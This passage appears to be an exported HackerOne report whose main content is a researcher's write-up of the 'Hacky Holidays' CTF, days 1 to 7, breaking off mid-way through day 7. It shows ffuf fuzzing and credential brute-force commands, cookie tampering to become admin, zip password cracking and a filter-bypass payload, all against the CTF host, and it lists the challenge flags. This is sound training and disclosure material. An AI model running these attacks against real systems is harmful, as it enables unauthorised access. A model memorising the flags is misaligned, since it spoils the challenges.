write-up.","automated_response":false,"created_at":"2021-01-12T21:23:24.159Z","updated_at":"2021-01-12T21:23:24.159Z","actor":{"username":"holme","cleared":false,"url":"/holme","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/oR64NYD1B7YVuyr3QEbru7tp/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10345770,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I can't remove the comments but I have made it a full disclosure. ","automated_response":false,"created_at":"2021-01-12T22:21:53.829Z","updated_at":"2021-01-12T22:21:53.829Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":10345847,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Cool, thanks!","automated_response":false,"created_at":"2021-01-12T22:28:20.957Z","updated_at":"2021-01-12T22:28:20.957Z","actor":{"username":"holme","cleared":false,"url":"/holme","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/oR64NYD1B7YVuyr3QEbru7tp/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10439660,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2021-01-21T20:17:26.511Z","updated_at":"2021-01-21T20:17:26.511Z","actor":{"url":"/h1-ctf","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"h1-ctf"}},"bounty_amount":"0.0","bounty_currency":"usd","bonus_amount":"500.0","genius_execution_id":null,"team_handle":"h1-ctf","collaborator":{"username":"holme","url":"/holme"},"actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":26230,"category":"team","content":"#","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":2413,"username":"nahamsec","name":"Ben Sadeghipour","bio":"","cleared":true,"website":"http://NahamSec.com/","location":"California","created_at":"2014-01-31T23:07:36.366Z","url":"https://hackerone.com/nahamsec","anc_triager":false,"hackerone_triager":false,"hackerone_employee":true,"user_type":"company","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/c11036e2d3f8b05af4b5da5984ccdec6f786b763c8abceb4e68042e10dcdae85"}}},{"id":26223,"category":"researcher","content":"{F1139915}\n\n## Day 1\n\nThe time has finally come! It's the first day of the 12 hacky holidays and we can finally begin to infiltrate the Grinch Networks and save this year's Christmas.\n\nShivering with excitement I navigated to `hackyholidays.h1ctf.com` to be met with the following screen:\n\n{F1139719}\n\nAs we are insanely 1337 hackers we know we need to fire up our Very Cool Advanced Information Gathering And Also Some Other Cool Words System TM to infiltrate our target system... Or maybe we should just try and navigate to `/robots.txt`?\n\n{F1139718}\n\nWell, that does it this time! We successfully found the first flag! We also got a lead on how to continue tomorrow: `/s3cr3t-ar3a`. Stay tuned to see how it goes!\n\n`flag{48104912-28b0-494a-9995-a203d1e261e7}`\n\n## Day 2\n\nTime for another challenge! Let's check out `/s3cr3t-ar3a`:\n\n{F1139720}\n\nOrdinary people might accept that there's nothing to do, but we're not just anyone, we're 1337 hackers! Let's pop up our beloved developer tools and investigate the source of the page:\n\n{F1139721}\n\nYay! We successfully found the 2nd flag and have been pointed towards tomorrow's challenge: `/apps`\n\n`flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}`\n\n## Day 3\n\n3rd day, 3rd challenge, let's begin! Navigating to `/apps` we can see that a new challenge, 'People Rate' has been added:\n\n{F1139722}\n\nLet's start the challenge. The challenge is located on `/people-rater` and appears to be an app that returns the rating of a list of people when clicking on them. Firing up Burp Suite and clicking the very first name, we notice that a `GET` request is sent to `/people-rater/entry?id=eyJpZCI6Mn0=`. The `GET` parameter `id` seems interesting. The value seems to be Base64 encoded. Let's try to decode it and see if our assumption is correct.\n\n{F1139723}\n\nIndeed, it was correct! We get a JSON with a parameter called `id`. Interestingly enough, the value of the `id` parameter is '2' even though we picked the very first name. Let's try to create our own Base64 encoded JSON object in the same format, but with the value '1' instead:\n\n```\n{\"id\":1} -\u003e eyJpZCI6MX0=\n```\n\nLet's now try to use our own tampered value in the `GET` request, making it: `/people-rater/entry?id=eyJpZCI6MX0=`. The request is successful and gives us the following response body:\n\n```JSON\n{\n    \"id\":\"eyJpZCI6MX0=\",\n    \"name\":\"The Grinch\",\n    \"rating\":\"Amazing in every possible way!\",\n    \"flag\":\"flag{b705fb11-fb55-442f-847f-0931be82ed9a}\"\n}\n```\n\nWe successfully got the 3rd flag!\n\n`flag{b705fb11-fb55-442f-847f-0931be82ed9a}`\n\n## Day 4\n\nA new day has come and it's time for the next challenge. Browsing to `/apps`, we notice a new challenge has been added: 'Swag Shop'. Let's fire up the challenge and see what we're dealing with.\n\nThe challenge appears to be a shop (what a surprise), but there's not much to do, since we're quickly faced with a login form, which doesn't seem easy to bypass. Let's instead think a bit more like a 1337 hacker and do some recon. Let's use FFUF to do some web content discovery. Now we need to pick a good wordlist. [Daniel Miessler's](https://github.com/danielmiessler) 'common.txt' for web content seems like a good start:\n\n```\nffuf -w common_webcontent.txt -t 5 -u \"https://hackyholidays.h1ctf.com/swag-shop/FUZZ\"\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.2.0-git\n________________________________________________\n\n :: Method           : GET\n :: URL              : https://hackyholidays.h1ctf.com/swag-shop/FUZZ\n :: Wordlist         : FUZZ: common_webcontent.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 5\n :: Matcher          : Response status: 200,204,301,302,307,401,403\n________________________________________________\n\napi                     [Status: 200, Size: 23, Words: 2, Lines: 1]00:16] :: Errors: 0 ::\n:: Progress: [4661/4661] :: Job [1/1] :: 41 req/sec :: Duration: [0:01:57] :: Errors: 0 ::\n```\n\nNavigating to `/api` doesn't return anything interesting. Let's try to find some API endpoints. We fire up FFUF again, but this time to fuzz for API endpoints using Daniel Miessler's 'common-api-endpoints-mazen160.txt'. To be sure we don't miss anything, let's match all response codes except `404` by using the flags `-mc all -fc 404`\n\n```\nffuf -w common-api-endpoints-mazen160.txt -t 5 -u \"https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ\" -mc all -fc 404\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.2.0-git\n________________________________________________\n\n :: Method           : GET\n :: URL              : https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ\n :: Wordlist         : FUZZ: common-api-endpoints-mazen160.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 5\n :: Matcher          : Response status: all\n :: Filter           : Response status: 404\n________________________________________________\n\nsessions                [Status: 200, Size: 2194, Words: 1, Lines: 1]03] :: Errors: 0 ::\nuser                    [Status: 400, Size: 35, Words: 3, Lines: 1]0:04] :: Errors: 0 ::\n:: Progress: [174/174] :: Job [1/1] :: 41 req/sec :: Duration: [0:00:05] :: Errors: 0 ::\n```\n\nWe discovered two endpoints: `/api/user` and `/api/sessions`! Let's start by checking `/api/user`. A simple `GET` request returns the following response:\n\n```JSON\nHTTP/1.1 400 Bad Request\nServer: nginx/1.18.0 (Ubuntu)\nDate: Tue, 29 Dec 2020 04:20:69 GMT\nContent-Type: application/json\nConnection: close\nContent-Length: 35\n\n{\n    \"error\":\"Missing required fields\"\n}\n```\n\nLooks like we're missing some parameter(s) in our request. Let's use FFUF once again to see if we can discover the missing parameter(s). Let's start by checking for `GET` parameters using Daniel Miessler's 'burp-parameter-names.txt'. Let's start by checking if any of the responses we get, doesn't contain the string: 'Missing required fields'. To do so, we can use the flag `-fr` to filter responses based on a regex:\n\n```\nffuf -w burp-parameter-names.txt -t 5 -u \"https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ\" -mc all -fr \"Missing required fields\"\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.2.0-git\n________________________________________________\n\n :: Method           : GET\n :: URL              : https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ\n :: Wordlist         : FUZZ: burp-parameter-names.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 5\n :: Matcher          : Response status: all\n :: Filter           : Regexp: Missing required fields\n________________________________________________\n\nuuid                    [Status: 404, Size: 40, Words: 5, Lines: 1]:00:33] :: Errors: 0 ::\n:: Progress: [2588/2588] :: Job [1/1] :: 40 req/sec :: Duration: [0:01:03] :: Errors: 0 ::\n```\n\nWe got a hit for 'uuid'! Now we just need a value for the parameter...\n\nLet's move on to the second API endpoint we discovered, `/api/sessions`. A simple `GET` request returns this interesting response body:\n\n```JSON\n{\n    \"sessions\":[\n        \"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=\",\n        \"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=\",\n        \"eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==\",\n        \"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=\",\n        \"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=\",\n        \"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=\",\n        \"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=\",\n        \"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0=\"\n        ]\n}\n```\n\nLet's try and Base64 decode these interesting values:\n\n```JSON\n{\n    \"user\":null,\n    \"cookie\":\"YzVmNTJiYTNkOWFlYTY2YjA1ZTY1NDBlNmI0YmZjMmNmZGYzMzg1MWJkZDcyMzY0ZTFlYjdmNDY3NDkzNzIwMGNiZjNhMjQ3Y2RmY2E2N2FmMzdjM2I0ZWNlZTVkM2VkNzU3MTUwYjdkYzkyNWI4Y2I3ZWZiNjk2N2NjOTk0MjU=\"\n},\n{\n    \"user\":null,\n    \"cookie\":\"ZjM2MzNjM2JkZGUyMzVmMmY2ZjcxNjdlNDNmZjQwZTlmY2RhNjYxNWM5Y2Y1ZjY2ODU3NjkxMTQ2Nzk0ZmIxOWZhN2ZhZjg0Y2E5Nzk1NTQ2MzMzZTc0MWJlMzVhZDA0MDUwYmQ3NDlmZTE4MmNkMjMxMzU0MWRlMTJhNWYzOGQ=\"\n},\n{\n    \"user\":\"C7DCCE-0E0DAB-B20226-FC92EA-1B9043\",\n    \"cookie\":\"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY=\"\n},\n{\n    \"user\":null,\n    \"cookie\":\"MDRmYTBhN2FiNjY5MGFlOWFmYTE4ZjE2N2JjZmYzZWJkOTRlOGYwMjI1OGIyNjM1ODU0Njc2YTdlZTM4MzFiM2I1MTUzMzViMjFhYzVkMTc4ODE3OGM4Y2JlOTk4MjJlMDI2YjQzZDQxMGNmNTg1ODQxZjBmODBmZWQxZmE1YmE=\"\n},\n{\n    \"user\":null,\n    \"cookie\":\"M2Q2MDIzNDg5MWE0N2M3NDJmNTIyNGM3NWUxYWQ0NDRlZWI3MTg4MjI3ZGRkMTllZTM2ZDkxMGVlNWEwNmZiZWFkZjZhODg4MDY3ODlmZGRhYTM1Y2IyMGVhMjA1NjdiNDFjYzBhMWQ4NDU1MDc4NDE1YmI5YTJjODBkMjFmN2Y=\"\n},\n{\n    \"user\":null,\n    \"cookie\":\"MWY3MTAzMTBjZGY4ZGMwYjI3Zjk2ZmYzMWJlMWEyZTg1YzE0MmZlZjMwYmJjZmQ4ZTU0Y2YxYzVmZTM1N2Q1ODY2YjFkZmFiNmI5ZjI1M2M2MDViNjA0ZjFjNDVkNTQ4N2U2ODdiNTJlMmFiMTExODA4MjU2MzkxZWNhNjFkNmU=\"\n},\n{\n    \"user\":null,\n    \"cookie\":\"MDM4YzhiN2Q3MmY0YjU2M2FkZmFlNDMwMTI5MjEyODhlNGFkMmI5OTcyMDlkNTJhZTc4YjUxZjIzN2Q4NmRjNjg2NmU1MzVlOWEzOTE5NWYyOTcwNmJlZDIyNDgyMTA5ZDA1OTliMTYyNDczNjFkZmU0MTgxYWEwMDU1ZWNhNzQ=\"\n},\n{\n    \"user\":null,\n    \"cookie\":\"OGI3N2ExOGVjNzM1ZWVmNTk2ZjNkZjIwM2ZjYzdjMWNhODg4NDhhODRmNjI0NDRjZTdlZTg0ZTUwNzZmZDdkYTJjN2IyODY5YjcxZmI5ZGRiYTgzZjhiZDViOWZjMTVlZDgzMTBkNzNmODI0OTM5ZDM3Y2JjZmY4NzEyOGE3NTM=\"\n}\n```\n\nThe cookie values seem to be some Base64 encoded SHA-512 hashes but don't seem to be of any use. The most interesting part is the one 'user' value which isn't just 'null': `C7DCCE-0E0DAB-B20226-FC92EA-1B9043`. Maybe we could use this as the value for the parameter 'uuid' in the request to `/api/user`?\n\n```JSON\nHTTP/1.1 200 OK\nServer: nginx/1.18.0 (Ubuntu)\nDate: Tue, 29 Dec 2020 23:27:25 GMT\nContent-Type: application/json\nConnection: close\nContent-Length: 216\n\n{\n    \"uuid\":\"C7DCCE-0E0DAB-B20226-FC92EA-1B9043\",\n    \"username\":\"grinch\",\n    \"address\":{\n        \"line_1\":\"The Grinch\",\n        \"line_2\":\"The Cave\",\n        \"line_3\":\"Mount Crumpit\",\n        \"line_4\":\"Whoville\"\n    },\n    \"flag\":\"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}\"\n}\n```\n\nYes! We successfully got day 4's flag!\n\n`flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}`\n\n## Day 5\n\nIt's yet another beautiful Christmas day and time for yet another challenge. Today we're met with the challenge 'Secure Login'. Opening up the challenge we're simply faced with a login screen. When trying to log in, a `POST` request is sent to `/secure-login` and we're faced with the following error:\n\n{F1139725}\n\nThe error 'Invalid Username' seems like an interesting message, since we can imagine that a valid username but valid password would yield a different error message, making it possible to start by brute-forcing the username and then take care of the password afterward. With the name of the challenge in mind, this seems like a fairly good path to take. Let's start up our good friend FFUF and provide it with Daniel Miessler's '10-million-password-list-top-1000.txt'. We'll start by brute-forcing the username and use `-fr` again to filter out responses containing the standard response, 'Invalid Username':\n\n```\nffuf -w 10-million-password-list-top-1000.txt -t 5 -X POST -H \"Content-Type: application/x-www-form-urlencoded\" -d \"username=FUZZ\u0026password=bla\" -u \"https://hackyholidays.h1ctf.com/secure-login\" -fr \"Invalid Username\"\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.2.0-git\n________________________________________________\n\n :: Method           : POST\n :: URL              : https://hackyholidays.h1ctf.com/secure-login\n :: Wordlist         : FUZZ: 10-million-password-list-top-1000.txt\n :: Header           : Content-Type: application/x-www-form-urlencoded\n :: Data             : username=FUZZ\u0026password=bla\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 5\n :: Matcher          : Response status: 200,204,301,302,307,401,403\n :: Filter           : Regexp: Invalid Username\n________________________________________________\n\naccess                  [Status: 200, Size: 1724, Words: 464, Lines: 37] :: Errors: 0 ::\n:: Progress: [1000/1000] :: Job [1/1] :: 40 req/sec :: Duration: [0:00:25] :: Errors: 0 ::\n```\n\nBingo! We got a valid username: 'access'. Time to brute force the password, this time by filtering for responses containing our new error message, 'Invalid Password':\n\n```\nffuf -w 10-million-password-list-top-1000.txt -t 5 -X POST -H \"Content-Type: application/x-www-form-urlencoded\" -d \"username=access\u0026password=FUZZ\" -u \"https://hackyholidays.h1ctf.com/secure-login\" -fr \"Invalid Password\"\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.2.0-git\n________________________________________________\n\n :: Method           : POST\n :: URL              : https://hackyholidays.h1ctf.com/secure-login\n :: Wordlist         : FUZZ: 10-million-password-list-top-1000.txt\n :: Header           : Content-Type: application/x-www-form-urlencoded\n :: Data             : username=access\u0026password=FUZZ\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 5\n :: Matcher          : Response status: 200,204,301,302,307,401,403\n :: Filter           : Regexp: Invalid Password\n________________________________________________\n\ncomputer                [Status: 302, Size: 0, Words: 1, Lines: 1]00:01] :: Errors: 0 ::\n:: Progress: [1000/1000] :: Job [1/1] :: 36 req/sec :: Duration: [0:00:25] :: Errors: 0 ::\n```\n\nPerfect! We got the password: 'computer'. Let's pop in the credentials and get the flag:\n\n{F1139726}\n\nWell... We got a bit ahead of ourselves there. Let's check how we've been authenticated. We can see that a cookie called 'securelogin' has been set to the value: `eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=`. Let's go ahead and Base64 decoded the value: `{\"cookie\":\"1b5e5f2c9d58a30af4e16a71a45d0172\",\"admin\":false}`. Since we're 1337 hackers, it seems very tempting to try and change the 'admin' parameter to `true` instead of `false`.\n\nLet's do as we did in day 3's challenge and tamper with the cookie to see if we get lucky:\n\n{F1139724}\n\nWhat a beautiful surprise! We've successfully become admins and can now see the zip file 'my_secure_files_not_for_you.zip'. Let's just download it and extract it to get the flag.\n\n{F1139681}\n(could we maybe just ignore my cringe early 'hacker name'?)\n\nWell... Still, a bit too fast. So while a password protected zip file wasn't exactly what we would hope for, it won't stop us! Let's try to use fcrackerzip with the infamous 'rockyou.txt' and see if we can crack the password to the zip file:\n\n{F1154657}\n\nAnd just like that, we got the password in a matter of seconds: 'hahahaha'! We can finally extract the zip file and open up 'flag.txt' to get the 5th flag!\n\n`flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}`\n\n## Day 6\n\nThe next challenge 'My Diary' has been added and we're asked to find a hidden upcoming event the grinch is planning. Starting up the challenge we see the following:\n\n{F1139682}\n\nWe can see some event's but the hidden event isn't listed (duh). The `GET` parameter 'template' seems interesting as both the name and value, 'entries.html', suggests it's used to specify some file to load. Providing something random as the value simply redirects us to `/my-diary/?template=entries.html` so there seems to be some validation going on before the specified file is attempted to be loaded. If only we could see what's going on behind the curtain... Wait, maybe we could just load 'index.php'? The following is thrown back at us when trying:\n\n```PHP\n\u003c?php\nif( isset($_GET[\"template\"])  ){\n    $page = $_GET[\"template\"];\n    //remove non allowed characters\n    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);\n    //protect admin.php from being read\n    $page = str_replace(\"admin.php\",\"\",$page);\n    //I've changed the admin file to secretadmin.php for more security!\n    $page = str_replace(\"secretadmin.php\",\"\",$page);\n    //check file exists\n    if( file_exists($page) ){\n       echo file_get_contents($page);\n    }else{\n        //redirect to home\n        header(\"Location: /my-diary/?template=entries.html\");\n        exit();\n    }\n}else{\n    //redirect to home\n    header(\"Location: /my-diary/?template=entries.html\");\n    exit();\n}\n```\n\nThat worked great! Now we know what's going on. It looks like the goal is to load the file 'secretadmin.php', but there's some filtering going on. Let's create an interactive PHP shell from the command line and use the following PHP function to do some testing:\n\n```PHP\nfunction test($page){\n    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);\n    $page = str_replace(\"admin.php\",\"\",$page);\n    $page = str_replace(\"secretadmin.php\",\"\",$page);\n    echo $page;\n}\n```\n\nNow we can simply call our function with some different values and see what we are left with after the filtering. Let's start by seeing if we can achieve to get the string 'admin.php' returned. Since the char combination 'admin.php' is removed from the input string using `str_replace()` we could try to split our desired target string, 'admin.php' in into two parts, eg: 'adm' and 'in.php'. We can then put the char combination 'admin.php' in between these two parts, since we know it'll be removed anyways, making our payload: `'adm'+'admin.ph'+'in.php' -\u003e admadmin.phpin.php`. Time to test:\n\n{F1139680}\n\nNice! Let's now move on to see if we can have the string 'secretadmin.php' returned. We can adapt the same idea from before, but we need to notice that the string 'secretadmin.php' also contains the string 'admin.php', which means that the 'admin.php' part will be removed before we get to the second use of `str_replace` which looks for 'secretadmin.php'. But what if we use something like the following:\n\n`'secretadm'+'secretadm'+'admin.php'+'in.php'+'in.php' -\u003e secretadmsecretadmadmin.phpin.phpin.php`\n\nAfter the first check, all occurrences of 'admin.php' will be removed, leaving us with:\n\n`secretadmsecretadm[admin.php]in.phpin.php -\u003e secretadmsecretadmin.phpin.php`\n\nAnd after the second check, all occurrences of 'secretadmin.php' will be removed, leaving us with:\n\n`secretadm[secretadmin.php]in.php -\u003e secretadmin.php`\n\nThat's exactly what we want! Our test function confirms that this works:\n\n{F1139683}\n\nTime to test our payload in the challenge:\n\n{F1139685}\n\nPerfect! We've successfully bypassed the filter, uncovered the Grinch's secret event, and retrieved the 6th flag! 'Launch DDoS Against Santa's Workshop!'... that doesn't sound good... We better get to sleep so we're well-rested to continue our quest to take down the Grinch Network and save Christmas!\n\n`flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}`\n\n## Day 7\n\nWell, look at that. It's a new day and a new challenge has arrived: 'Hate Mail Generator'. The challenge is wrapped in a 'Hate Mail Generator' app which makes it possible to create mail templates. We can see a template has already been saved, called 'Guess What'.\n\n{F1139686}\n\nWe can see that some template engine is being used and two use cases can be seen in 'Guess What'.\n\n1. Variables such as 'name' which will be replaced by a value\n2. The inclusion of a template such as 'cbdj3_grinch_header.html' which will be replaced by the contents of 'cbdj3_grinch_header.html'\n\nClicking the 'preview' button we see this transformation in action:\n\n{F1139688}\n\nWe also have the option of creating our own template. Trying to save it, we get the following error:\n\n{F1139689}\n\nBut we're still able to preview our own templates. Let's try to create our own template and preview it. We notice that a `POST` request is sent to `/hate-mail-generator/new/preview`\n\n```JSON\nPOST /hate-mail-generator/new/preview HTTP/1.1\nHost: hackyholidays.h1ctf.com\nConnection: close\nContent-Length: 102\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: https://hackyholidays.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://hackyholidays.h1ctf.com/hate-mail-generator/new\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\n\npreview_markup=hihi\u0026preview_data={\"name\":\"Alice\",\"email\":\"alice@test.com\"}\n```\n\nThe request body contains two parameters: 'preview_markup', which is set to whatever we have typed in the body of our template, and 'preview_data' which appears to provide a JSON object with the data used to generate our template. Let's try to provide our own JSON object:\n\n`{\"hihi\":\"blabla\"}`\n\nand see if we're now able to use 'hihi' as a variable:\n\n{F1139690}\n\nYup, that works. Let's note that down and move on.\n\nThe templates used (eg. 'cbdj3_grinch_header.html') seems interesting. I wonder where they are stored... Let's fire up FFUF with Daniel Miessler's 'common.txt' for web content and see if we discover something:\n\n```\nffuf -w common_webcontent.txt -t 5 -u \"https://hackyholidays.h1ctf.com/hate-mail-generator/FUZZ\"\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ 